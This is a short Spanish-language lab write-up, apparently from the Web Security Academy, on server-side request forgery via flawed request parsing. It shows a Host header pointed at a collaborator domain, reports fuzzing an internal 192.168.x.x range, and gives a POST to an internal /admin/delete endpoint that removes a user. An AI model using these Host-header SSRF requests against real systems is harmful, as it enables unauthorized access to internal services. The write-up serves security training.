---
title: "5 - SSRF via flawed request parsing"
---

# 5 - SSRF via flawed request parsing

Recibimos la request en el collaborator:
```HTTP
GET https://0a61007d0390a47880d9d5ac00590055.web-security-academy.net/login HTTP/2
Host: 3dhc83ec9otzqu1l1546kw9e45a2yvvjk.oastify.com
```

Fuzzeamos de 192.168.0.0 a 192.168.255.255 y encontramos que en 192.168.0.30 en vez de tirarnos 504 nos tira 404.

```HTTP
POST https://0a61007d0390a47880d9d5ac00590055.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.30

csrf=1234&username=carlos
```
